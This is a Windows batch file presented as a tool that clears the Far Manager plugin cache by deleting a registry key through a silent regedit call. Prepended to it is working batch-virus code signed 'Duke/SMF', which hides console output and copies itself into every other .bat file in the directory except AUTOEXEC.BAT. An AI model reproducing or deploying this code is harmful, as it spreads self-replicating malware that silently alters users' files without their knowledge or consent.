@ctty nul%SMF%
if "%1=="@ goto SMFz
find "SMF"<%0>SMF.bat
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call SMF.bat @ %%b
del SMF.*
ctty con%SMF%
@goto SMF
:SMFz
find "SMF"<%2
if not errorlevel 1 goto SMF
type %2>SMF.1
type SMF.bat>%2
type SMF.1>>%2
:SMF [Duke/SMF]
rem -------------------------------------------------------------------------------------------------------------
@echo off
rem This batch file cleared the Plugin Cache

echo REGEDIT4 > "%TEMP%\$DelOld$.reg"
echo [-HKEY_CURRENT_USER\Software\Far\PluginsCache] >> "%TEMP%\$DelOld$.reg"
start/wait regedit -s "%TEMP%\$DelOld$.reg"
del "%TEMP%\$DelOld$.reg" > nul
rem -------------------------------------------------------------------------------------------------------------